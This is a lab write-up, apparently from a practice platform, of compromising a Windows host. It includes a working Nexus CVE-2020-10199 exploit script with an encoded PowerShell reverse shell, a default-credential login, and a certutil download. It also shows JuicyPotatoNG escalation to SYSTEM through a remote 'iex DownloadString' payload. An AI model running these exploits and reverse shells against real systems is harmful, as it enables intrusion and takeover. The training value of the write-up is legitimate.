```
└─$ nmap -sC -sV -p- 192.168.213.61
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-15 23:25 CDT
Nmap scan report for 192.168.213.61
Host is up (0.058s latency).
Not shown: 65522 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: BaGet
|_http-server-header: Microsoft-IIS/10.0
|_http-cors: HEAD GET POST PUT DELETE TRACE OPTIONS CONNECT PATCH
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
8081/tcp  open  http          Jetty 9.4.18.v20190429
|_http-server-header: Nexus/3.21.0-05 (OSS)
|_http-title: Nexus Repository Manager
| http-robots.txt: 2 disallowed entries 
|_/repository/ /service/
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-07-16T04:29:19
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_clock-skew: 36s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 223.03 seconds

```

Checked out FTP on 21. And was informed that I needed to use secure connection. I tested with a few settings and also included filezilla, but was unable to login.

I checked on port 80, but there was only a service that had no exploits or information.

Lastly, I checked on port 8081. I was able to guess the login as `nexus:nexus` as the service was named that. ALWAYS TRY THE NAMES ON THE PAGE AS BOTH USER AND PASSWORD. CREATE A LIST IF NEEDED USING CEWL. I was able to find an authenticated exploit.
https://www.exploit-db.com/exploits/49385

I edited the exploit for a reverse shell using powershell.

```
# Exploit Title: Sonatype Nexus 3.21.1 - Remote Code Execution (Authenticated)
# Exploit Author: 1F98D
# Original Author: Alvaro Muñoz
# Date: 27 May 2020
# Vendor Hompage: https://www.sonatype.com/
# CVE: CVE-2020-10199
# Tested on: Windows 10 x64
# References:
# https://securitylab.github.com/advisories/GHSL-2020-011-nxrm-sonatype
# https://securitylab.github.com/advisories/GHSL-2020-011-nxrm-sonatype
#
# Nexus Repository Manager 3 versions 3.21.1 and below are vulnerable
# to Java EL injection which allows a low privilege user to remotely
# execute code on the target server.
#
#!/usr/bin/python3

import sys
import base64
import requests

URL='http://192.168.213.61:8081'
CMD='powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQA2ACIALAA0ADQANAAzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=='
USERNAME='nexus'
PASSWORD='nexus'

s = requests.Session()
print('Logging in')
body = {
    'username': base64.b64encode(USERNAME.encode('utf-8')).decode('utf-8'),
    'password': base64.b64encode(PASSWORD.encode('utf-8')).decode('utf-8')
}
r = s.post(URL + '/service/rapture/session',data=body)
if r.status_code != 204:
    print('Login unsuccessful')
    print(r.status_code)
    sys.exit(1)
print('Logged in successfully')

body = {
    'name': 'internal',
    'online': True,
    'storage': {
        'blobStoreName': 'default',
        'strictContentTypeValidation': True
    },
    'group': {
        'memberNames': [
            '$\\A{\'\'.getClass().forName(\'java.lang.Runtime\').getMethods()[6].invoke(null).exec(\''+CMD+'\')}"'
        ]
    },
}
r = s.post(URL + '/service/rest/beta/repositories/go/group', json=body)
if 'java.lang.ProcessImpl' in r.text:
    print('Command executed')
    sys.exit(0)
else:
    print('Error executing command, the following was returned by Nexus')
    print(r.text)

```

I got a reverse shell on port 4443.

After logging in, I checked with the new user nathan what permissions he had.

```
PS C:\Users> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled

```

Found that he had the permissions needed for JuicyPotatoNG. 

I uploaded that using:
```
certutil.exe -urlcache -f http://192.168.45.216/JuicyPotatoNG.exe JuicyPotatoNG.exe
```

I then ran the following command after creating a reverse shell ps1 file in the root of my web server.

```
.\JuicyPotatoNG.exe -t * -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://192.168.45.216/mypowershell.ps1')"

```

```
nc -lvnp 4444                                   
listening on [any] 4444 ...
connect to [192.168.45.216] from (UNKNOWN) [192.168.213.61] 49825
whoami
nt authority\system
cd C:\

dir
BaGet inetpub PerfLogs Program Files Program Files (x86) TEST Users Windows
cd C:\Users

dir
Administrator BaGet nathan Public
cd Administrator

dir
3D Objects Contacts Desktop Documents Downloads Favorites Links Music OneDrive Pictures Saved Games Searches Videos
cd Desktop

dir
Microsoft Edge.lnk proof.txt
more proof.txt
bac83836eced08d362bc6d03504f12d0 
```

I then had system!